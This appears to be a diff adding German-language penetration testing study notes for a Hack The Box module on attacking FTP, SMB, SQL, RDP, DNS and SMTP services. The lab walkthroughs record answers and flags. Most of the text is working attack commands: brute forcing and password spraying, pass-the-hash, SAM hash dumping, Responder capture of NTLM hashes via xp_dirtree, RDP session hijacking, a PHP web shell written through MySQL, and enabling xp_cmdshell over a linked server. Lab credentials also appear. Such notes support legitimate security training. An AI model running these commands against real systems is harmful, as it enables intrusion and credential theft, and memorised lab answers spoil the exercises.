@@ -1,0 +1,570 @@
+Attacking Common Services
+Protocol Specific Attacks
+1. The Concept of Attacks:
+- Das Konzept basiert auf 4 Kategorien die bei jeder Schwachstelle auftreten
+- Zuerst gibt es die Quelle die die Anfrage zum Prozess ausfuehrt in dem die Schwachstelle zu finden ist
+- Jeder Prozess hat eigene Priviligien mit denen der Prozess ausgefuehrt wird
+- Jeder Prozess hat einen Ziel Daten zu erstellen oder zu uebertragen
+
+- Source:
+	- Als Source bezeichnen wir die Quelle von Informationen die von einem Prozess verwendet werden
+	- Es gibt verschiedene Wege um Information an Prozess weiterzugeben:
+		- Code, Libraries, Config, APIs, User Input
+
+- Process:
+	- Eine Prozess verarbeitet Informationen von der Quelle
+	- Meistens ist die Logik in Code festgehalten
+	- Die meisten Schwachstellen befinden sich im Code
+	- Prozess Komponente:
+		- PID(Process ID), Input, Data Processing(Code), Variables, Logging
+
+- Privileges:
+	- Priviliegien bestimmen mit welchen Rechten der Prozess ausgefuehrt wird
+	- Wie koennen die Privilegien in Gruppen unterteilen:
+		- System: Sind die hoechsten Privilegien in Windows SYSTEM in Linux root
+		- User: Privilegien von einem User
+		- Group: Privilegien einer Gruppe
+		- Policies: Richtlinien bestimmen die Ausführung von anwendungsspezifischen Befehlen
+		- Rules: Regeln sind die Berechtigungen zur Durchführung von Aktionen
+
+- Destination:
+	- Jede Task hat einen Zweck/Ziel der erfuellt werden muss
+	- Das Ergebnis eines solchen Task soll gespeichert oder weitergeleitet werden
+
+2. Service Misconfiguration:
+- Authentication:
+	- Viele Sicherheitsschwachstellen waren Standardcredentials die nach Installation nicht gesetzt worden sind
+
+- Access Rights:
+	- Zugriffsrechte bei denen User mehr Rechte haben als ihnen zu stehen sind eine haeufige Art von Schwachstellen
+
+3. Finding Sensitive Information:
+- Fuer Attacken ist es wichtig so viele Informationen wie moeglich zu sammeln
+- Diese Informationen koennen Credentials von anderen Usern oder config Dateien sein
+###################################################################################################
+FTP
+1. Atacking FTP:
+- File Tranfer Protocol(FTP) ist ein Netzwerkprotokoll um Dateien von einem zum anderen Computer zu transferrieren
+- FTP laeuft auf TCP Port 21
+- Zuerst muessen wir den Server enumerieren und dann nach Schwachstellen gucken
+
+- Enumeratio:
+	- Mit Nmap wird der Server enumeriert
+
+- Misconfiguration:
+	- Mit dem Usernamen anonymous und ohne Passwort ist das Standardpasswort fuer FTP
+	- Wenn der Login erfolgreich ist koennen Befehle wie ls, cd, get, put usw verwendet werden
+
+- Brute Forcing:
+		- Mit dem tool medusa kann Passwort und Usernamen ausprobiert werden
+		- medusa -u <Usernamen> -P <Wortliste> -h <Url> -M ftp
+
+- FTP Bounce Attack:
+	- Bei einem Bounce Attack werden Befehle auf dem FTP Server ausgefuehrt um Geraete auf dem Netzwerk zu erreichen
+	- Mit dem nmap -b Flag kann ein FTP Bounce Attack durchgefuehrt
+	- nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+
+nmap 10.129.203.6 -sC -sV
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-27 20:23 BST
+Nmap scan report for 10.129.203.6
+Host is up (0.070s latency).
+Not shown: 995 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
+|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
+|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
+53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+139/tcp  open  netbios-ssn Samba smbd 4.6.2
+445/tcp  open  netbios-ssn Samba smbd 4.6.2
+2121/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (InlaneFTP) [10.129.203.6]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2121-TCP:V=7.92%I=7%D=3/27%Time=6421ED2E%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,8B,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.
+SF:203\.6\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
+SF:ive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\r
+SF:\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-time: 
+|   date: 2023-03-27T19:23:44
+|_  start_date: N/A
+
+
+ftp 10.129.203.6 2121
+robin
+7iz4rnckjsduza7
+
+###################################################################################################
+SMB
+1. Attacking SMB:
+- Server Message Block(SMB) ist ein Kommunikations Protokoll um Dateien im Netzwerk zu teilen
+- Laeuft auf NetBIOS ueber TCP Port 139 und fuer UDP ueber Ports 137 und 138 
+- SMB kann aber auch ueber TCP Port 445 alleine laufen
+- Ein weiters Protokoll ist MSRPC(Microsoft Remote Procedure Call) mit dem Prozeduren in einem Netzwerk auszufuehren sind
+
+- Enumeration:
+	- sudo nmap 10.129.14.128 -sV -sC -p139,445
+
+- Misconfiguration:
+	- SMB kann ohne Authentifikation verbunden werden nmur mit null session
+		- smbclient -N -L //<Url>
+	- Mit smbmap kann ein Netzwerk enumeriert werden
+		- smbmap -H <Url>
+		- smbmap -H <Url> -r notes
+		- smbmap -H <Url> --download "<Share>\note.txt"
+		- smbmap -H <Url> --upload test.txt "<Share>\test.txt"
+
+- Remote Procedure Call (RPC):
+	- rpcclient kann verwendet werden um in einem Netzwerk zu enumerieren
+	- Mit rpcclient kann auch fuer null sessions verwendet werden
+		- rpcclient -U'%' <Url>
+	- Enum4linux ist ein weiteres Tool um null sessions zu unterstuetzen um ein Netzwerk zu enumerieren
+		- ./enum4linux-ng.py <Url> -A -C
+
+- Protocol Specifics Attacks:
+	- Wenn eine null session nicht verfuegbar ist kann das Passwort mit bruteforc erlangt werden
+	- crackmapexec smb <Url> -u <Wordlist_User> -p <Wordlist_Password>
+
+- SMB:
+	- Um mit einer Remote Machine zu verbinden
+		- impacket-psexec <User>:'<Password>'@<Url>
+	- Execute PowerShell Command
+		- crackmapexec smb <Url> -u <User> -p '<Passwort>' -x '<Powershell_Command>' --exec-method smbexec
+	- Enumerierung SMB
+		- crackmapexec smb <Url>/24 -u <User> -p '<Passwort>' --loggedon-users
+	- Extract Hashes from SAM Database:
+		- crackmapexec smb <Url> -u <User> -p '<Passwort>' --sam
+	- Pass-the-Hash (PtH) Attack:
+		- crackmapexec smb <Url> -u <User> -H <Hash>
+
+- Forced Authentication Attacks:
+	- Wir koennen mit Responder einen eigenen SMB Server starten um User Hashes abzufangen
+		- responder -I <interface name>
+	- Die Hashes koennen dannmit hashcat gecrackt werden
+		- hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+10.129.254.186
+Sharename:
+GGJ
+
+Password for User jason:
+[+] 10.129.254.186:445    - 10.129.254.186:445 - Success: '.\jason:34c8zuNBo91!@28Bszh'
+
+rpcclient -U'%' 10.129.254.186
+rpcclient $> enumdomusers
+user:[jason] rid:[0x3e8]
+user:[robin] rid:[0x3e9]
+rpcclient $> 
+
+
+###################################################################################################
+SQL Databases
+1. Attacking SQL Databases:
+- MySQL und MsSQL sind bekannte relationale Datenbanken sie werden duch die Sprache SQL verwaltet
+
+- Enumeration:
+	- MsSQL laeuft auf TCP/1433 und UDP/1434
+	- MySQL laeuft auf TCP/3306 hidden laeuft auch auf TCP/2433
+	- Banner Grabbing:
+		- nmap -Pn -sV -sC -p1433 <Url>
+
+- Authentication Mechanism:
+	- MsSQL unterstuetz 2 Authentications Modis:
+		- Windows authentication mode: Ist mit Active Directory verknuepft. Windows User und Gruppen koennen sich in MsSQL einloggen
+		- Mixed mode: Unterstuezt Login via Usernamen und Passwort
+
+- Protocol Specific Attacks:
+	- Connect to MySQL Server from Linux:
+		- mysql -u <User> -p<Password> -h <IP>
+	- CMD connect to SQL Server:
+		- sqlcmd -S SRVMSSQL -U <User> -P '<Password>' -y 30 -Y 30
+	- Linux connect to MsSQL:
+		- sqsh -S <IP> -U <User> -P '<Password>' -h
+		- mssqlclient.py -p <Port> <User>@<IP>
+
+10.129.170.144
+Authenticate to 10.129.170.144 with user "htbdbuser" and password "MSSQLAccess01!"
+
+
+1. What is the password for the "mssqlsvc" user?
+2. Enumerate the "flagDB" database and submit a flag as your answer.
+
+
+SQL 
+	EXEC master..xp_dirtree '\\10.10.15.220\share\'
+sudo responder -I tun0
+
+[SMB] NTLMv2-SSP Client   : 10.129.170.144
+[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
+[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:acd860e47ddc6d74:A8214E169F89DA772A5076CCDA78ACCB:0101000000000000002674A04563D90111CDEDA6516779C70000000002000800560056005300460001001E00570049004E002D00520053005A0046005900370049004F004D004C00520004003400570049004E002D00520053005A0046005900370049004F004D004C0052002E0056005600530046002E004C004F00430041004C000300140056005600530046002E004C004F00430041004C000500140056005600530046002E004C004F00430041004C0007000800002674A04563D901060004000200000008003000300000000000000000000000003000008A85ADB623B251ED35A0ACFF6112970E79D26667A79D1FC2D48600657F5F4A0B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200320030000000000000000000
+princess1
+
+
+
+EXEC master..xp_subdirs '\\10.10.15.220\share\'
+EXEC master..xp_dirtree '\\10.10.15.220\share\'
+
+hashcat -m 5600 hash /usr/share/wordlist/rockyou.txt
+princess1
+
+
+impacket-mssqlclient -p 1433 mssqlsvc@10.129.170.144 -windows-auth
+
+SELECT name FROM master.dbo.sysdatabases
+USE flagDB
+SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
+
+###################################################################################################
+RDP
+1. Attacking RDP:
+- Remote Desktop Protocol(RDP) ist ein Protokoll vom Microsoft mit dem es einem User moeglich ist ein graphisches Interface auf einem anderen PC zu erlangen
+- Laeuft auf TCP Port 3389
+
+- Misconfigurations:
+	- mit crowbar/hydra koennen wir einen Spraying attack gegen einen RDP Service ausfuehren
+	- crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+	- hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+	- Grossbuchstaben fuer eine Datei und Kleinbuchstaben fuer einen String
+
+- RDP Login: xfreerdp /v:<URL> /u:<User> /p:<Password>
+
+- RDP Session Hijacking:
+	- Mit query user in Powershell koennen sich die Sessions angezeigt werden
+	- Um eine Session ohne ein Passwort zu imitieren benoetigen wir SYSTEM Privilegien
+	- tscon.exe erlaubt es uns mit anderen desktop sessions zu verknuepfen
+		- CMD: tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+	- Ein Trick um SYSTEM Privilegien zu erlangen ist, ein Windows Service als Local System auszufuehren und mit SYSTEM Privilegien auszufuehren
+	- Wir werden das sc.exe Binary verwenden 
+	- binpath Befehl welchen wir ausfuehren wollen
+	- CMD/PowerShell: sc.exe create <service_name> binpath= "cmd.exe /k tcson 1 /dest:rdp-tcp#0"
+	- CMD: net start sessionhijack
+	- Wenn wir den Service starten bekommen wir ein neues terminal mit dem Benutzer der anderen Session
+
+- RDP Pass-the-Hash(PtH):
+		- Wenn wir nur einen Hash in der SAM Datenbank finden koennen wir uns auch mit diesem in das System einloggen wenn das cracken des Hashes nicht geschieht
+		- Dies kann nur geschehen wenn Restricted Admin Mode eingeschaltet ist, dieser kann in CMD eingeschaltet werden
+		-CMD: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+		- xfreerdp /v:<URL> /u:<User> /pth:<Hash>
+
+
+RDP to 10.129.232.106 with user "htb-rdp" and password "HTBRocks!"
+xfreerdp /v:10.129.232.106 /u:htb-rdp /p:HTBRocks!
+1. What is the name of the file that was left on the Desktop? (Format example: filename.txt):
+- pentest-notes.txt
+2. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?:
+- DisableRestrictedAdmin
+3. Connect via RDP with the Administrator account and submit the flag.txt as you answer.:
+- xfreerdp /v:10.129.232.106 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
+- HTB{RDP_P4$$_Th3_H4$#}
+##################################################################################################
+DNS
+1. Attacking DNS:
+- Domain Name System(DNS) uebersetzt Domain namen in IP Adressen
+- Laeuft meistens auf dem UDP Port 53 oder manchmal auch auf TCP Port 53
+
+- DNS Zone Transfer:
+	- Eine DNS Zone ist ein Teil eines DNS Namespaces welches von einem Admin/Organisation verwaltet wird
+	- DNS Server kopieren Teile der DNS Zone Transfer Datenbanken zu einer anderen DNS Datenbank
+	- Jeder kann eine Kopie einer DNS Zone einfordern
+	- Wir koennen hierfuer dig verwenden mit der Option AXFR
+	- DIG AXFR Name_server Domaine
+	- Mit firece kann ebenso einen DNS Zonen Transfer durchfuehren
+
+- Domain Takeovers & Subdomain Enumeration:
+	- Es wird eine Domaine registriert um eine andere zu uebernehmen
+	- Hier koennen wir Domainen uebernehmen und dadurch Websiten mit schaedlichem Content ausfuehren
+	- Subdomain Enumeration:
+		- Bevor wir eine Subdomaine uebernehmen sollten wir alle Subdomainen enumerieren
+		- ./subfinder -d Domain -v
+		- Subbrute:
+			- Mit subbrute koennen interne DNS brute force Angriffe intern durchgefuehrt werden
+			- ./subbrute Domaine -s Sub_Domain_List.txt -r Resolver
+			- Der Resolver ist ein interner DNS Server 
+
+- DNS Spoofing:
+	- DNS spoofing wird auch DNS Cache Poisoning genannt
+	- Dieser Angriff aendert DNS Eintraege mit falschen Informationen um Traffic umzuleiten
+	- Dies durch einen Man-in-the-Middle(MITM) Angriff passieren wenn alle DNS Anfragen vom Angreifer umgeleitet werden
+	- Local DNS Cache Poisoning:
+		- Mit Tools wie Ettercap/Bettercap kann ein DNS Cache Poisoning mit MITM durchgefuehrt werden
+		- Wir muessen Ettercap/Bettercap FIle aendern um die domaine auf unsere IP umzumappen
+		- nano /etc/ettercap/etter.dns
+		- inlanefreight.com      A   192.168.225.110
+		- *.inlanefreight.com      A   192.168.225.110
+		- Danach koennen Ettercap oefffnen und Host > Scan for Hosts starten
+
+10.129.203.6
+1. Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.:
+
+nmap -p53 -Pn -sV -sC 10.129.203.6
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-30 23:56 BST
+Nmap scan report for 10.129.228.59
+Host is up (0.011s latency).
+
+PORT   STATE SERVICE VERSION
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds
+
+
+echo "10.129.203.6" > resolvers.txt
+python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
+	inlanefreight.htb
+	hr.inlanefreight.htb
+
+dig AXFR @inlanefreight.htb hr.inlanefreight.htb
+
+###################################################################################################
+SMTP
+1. Attacking Email Services:
+- Ein mail server ist ein Server welcher Emails sendet und empfaengt ueber ein Netzwerk 
+- Beim Senden wird eine Verbindung mit einem SMTP(Simple Mail Transfer Protocol) Server etabliert
+- Wenn wir Emails downloaden von einer Mail Anwendung verwenden wir POP3 oder IMAP4 um uns mit dem Mail Server zu verbinden
+- POP3 Clients entfernen heruntergeladene Nachrichten vom Mail Server
+- IMAP4 Clientes entfernen heruntergeladene Nachrichten nicht mail Mail Server
+
+- Enumeration:
+	- Mit Nmap koennen wir die Maschinen enumerieren
+		- sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128
+	- Heutzutage verwenden viele Unternehmen Cloud Dienste fuer die Emails wie Microsoft 365 oder G-Suite
+	- Wir koenen Mail eXchanger(MX) DNS Eintraege verwenden um einen Mail Server zu identifizieren
+	- MX Eintraege beinhalten Domain Namen und Mail Server
+	- Wir koennen Tools wie host oder dig verwenden
+		- host -t MX <Domain>
+		- dig mx <Domain>| grep "MX" | grep -v ";"
+		- host -t A <Mail_Domain>
+	- Mit telnet <IP> koennen wir uns mit einem Mail Server verbinden
+
+- Misconfiguration:
+	- Eine Miskonfiguration kann sein, dass ein Login mit dem User anonymous zugelassen wird
+	- Mit VRFY,EXPN und RCPT TO koennen wir Usernamen enumerieren in einem SMTP Server
+	- VRFY ueberprueft einen Usernamen in einem Mail Server
+		- VRFY <Usernamen>
+	- EXPN listet alle User auf einer Liste aus
+		- EXPN support-team
+		- Listet alle User im support-team auf
+	- RCPT identifiziert den Empfaenger oder Sender einer Nachricht
+		- MAIL FROM:<Mail_Adresse>
+		- RCPT TO:<User>
+	- In POP3 koennen wir ebenso die Usernamen enumerieren
+	- Wir koennen den Befehl USER verwenden um zu pruefen ob ein User vorhanden ist
+		- USER <Usernamen>
+	- Mit dem Tool smtp-user-enum koennen wir den Prozess automatisch enumerieren
+		- smtp-user-enum -M <RCPT,ERFT,EXPN> -U <userlist.txt> -D <Domain> -t <IP>  
+
+- Cloud Enumeration:
+	- Viele Firmen haben einen Mail Server in der Cloud 
+	- Ein Tool um diese Mail Server zu enumerieren ist O365spray, welches extra fuer Microsoft Office 365 entwickelt worden ist
+	- python3 o365spray.py --validate --domain <Domain>
+	- python3 o365spray.py --enum -U <User_List> --domain <Domain>
+
+- Password Attacks:
+	- Wir koennen Hydra verwenden um Passwoerter in SMTP, POP3, IMAP4 zu knacken
+	- hydra -L <User_File> -p '<Password>' -f <IP> <Protocol>
+	- Mit O365 koennen wir auch einen Spraying Angriff durchfuehren
+	- python3 o365spray.py --spray -U <User_File> -p '<Password>' --count 1 --lockout 1 --domain <Domain>
+	- 
+
+Target: 10.129.89.16910.129.157.15
+110 pop3
+143 imap
+465 smtps
+587 smtp
+993 imaps
+995 pop3s
+1433 MSSQL
+3389 ms-wbt-server
+
+
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.157.15
+marlin@inlanefreight.htb
+
+hydra -l 'marlin@inlanefreight.htb' -P pws.list -f 10.129.157.15 smtp
+poohbear
+
+echo -n 'marlin' | base64
+telnet 10.129.178.151 25
+auth login base64(marlin)
+
+dig mx inlanefreight.com
+inlanefreight.com.	300	IN	MX	10 mail1.inlanefreight.com
+
+telnet 10.129.207.68 25
+https://www.shellhacks.com/retrieve-email-pop3-server-command-line/
+
+
+telnet 10.129.207.68 143
+1 LOGIN marlin@inlanefreight.htb poohbear	
+1 LIST "" *	
+1 SELECT INBOX
+1 FETCH 1 BODY[TEXT]
+
+1. What is the available username for the domain inlanefreight.htb in the SMTP server?
+- marlin
+
+2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
+- HTB{w34k_p4$$w0rd}
+
+###################################################################################################
+Skills Assessment:
+1. Attacking Common Services - Easy:
+- You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer
+
+Target: 10.129.203.7
+nmap -sC -sV -Pn 10.129.203.7
+21/tcp open ftp Version 2.0
+25/tcp open smtp hMailServer smtpd
+80/tcp open http Apache httpd 2.4.53
+	Welcome to XAMPP
+	http://10.129.203.7/dashboard
+443/tcp https 
+587/tcp open smtp hMailServer smtpd
+3306/tcp open mysql MariaDB
+
+3389/tcp open ms-wbt-server Microsoft Terminal Services
+
+
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+fiona@inlanefreight.htb
+hydra -l 'fiona@inlanefreight.htb' -P pws.list -f 10.129.203.7 smtp
+
+Email Login: fiona@inlanefreight.htb Password:987654321 
+FTP Login: fiona Password: 987654321
+
+
+Mysql:
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\webshell.php';
+inlanefreight.htb/shell.php?c=dir
+
+
+http://inlanefreight.htb/shell.php?c=dir%20..\..\Users\Adminstrator\Desktop
+http://inlanefreight.htb/shell.php?c=type%20..\..\Users\Adminstrator\Desktop\flag.txt
+###################################################################################################
+2. Attacking Common Services - Medium:
+Target: 10.129.225.253
+
+nmap -sV -sC 10.129.97.56
+22/tcp open ssh
+53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux)
+110/tcp open pop3 Dovecot pop3d
+995/tcp open ssl/pop3 Dovecot pop3d
+2121/tcp open ftp
+
+###################################################################################################
+3. Attacking Common Services - Hard:
+135/tcp open msrpc
+445/tcp open microsoft/ds
+1433/tcp open Microsoft SQL Server 2019
+3389/tcp open Miscoroft Terminal Services
+
+
+smbclient -N -L ////10.129.225.253//Home
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Home            Disk      
+	IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+
+
+smbmap -u simon -H 10.129.203.10 -r Home/IT
+[+] Guest session   	IP: 10.129.203.10:445	Name: 10.129.203.10                                     
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Home                                              	READ ONLY	
+	.\HomeIT\*
+	dr--r--r--                0 Thu Apr 21 21:11:44 2022	.
+	dr--r--r--                0 Thu Apr 21 21:11:44 2022	..
+	dr--r--r--                0 Thu Apr 21 21:11:53 2022	Fiona
+	dr--r--r--                0 Thu Apr 21 22:15:09 2022	John
+	dr--r--r--                0 Thu Apr 21 22:16:07 2022	Simon
+
+
+smbmap -u simon -H 10.129.203.10 --download 'Home\IT\Simon\random.txt'
+cat 10.129.203.10-Home_IT_Simon_random.txt 
+Credentials
+
+(k20ASD10934kadA
+KDIlalsa9020$
+JT9ads02lasSA@
+Kaksd032klasdA#
+LKads9kasd0-@
+
+smbmap -u simon -H 10.129.203.10 --download 'Home\IT\Fiona\creds.txt'
+cat 10.129.203.10-Home_IT_Fiona_creds.txt 
+Windows Creds
+
+kAkd03SA@#!
+48Ns72!bns74@S84NNNSl
+SecurePassword!
+Password123!
+SecureLocationforPasswordsd123!!
+
+
+smbmap -u simon -H 10.129.203.10 --download 'Home\IT\John\secrets.txt'
+cat 10.129.203.10-Home_IT_John_secrets.txt 
+Password Lists:
+
+1234567
+(DK02ka-dsaldS
+Inlanefreight2022
+Inlanefreight2022!
+TestingDB123
+
+
+cat 10.129.203.10-Home_IT_John_information.txt 
+To do:
+- Keep testing with the database.
+- Create a local linked server.
+- Simulate Impersonation.
+
+
+xfreerdp /v:10.129.203.10 /u:Fiona /p:'48Ns72!bns74@S84NNNSl'
+
+
+impacket-mssqlclient -p 1433 fiona@10.129.203.10 -windows-auth
+48Ns72!bns74@S84NNNSl
+
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+	john
+	simon
+
+SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
+
+USE Master
+EXECUTE AS LOGIN = 'john' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT srvname, isremote FROM sysservers
+
+EXECUTE('sp_configure''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
+EXECUTE('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+
+EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1') AT [LOCAL.TEST.LINKED.SRV]
+EXECUTE('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+
+
+EXECUTE('SELECT * FROM OPENROWSET(BULK N''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV]
+
+
+
+
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
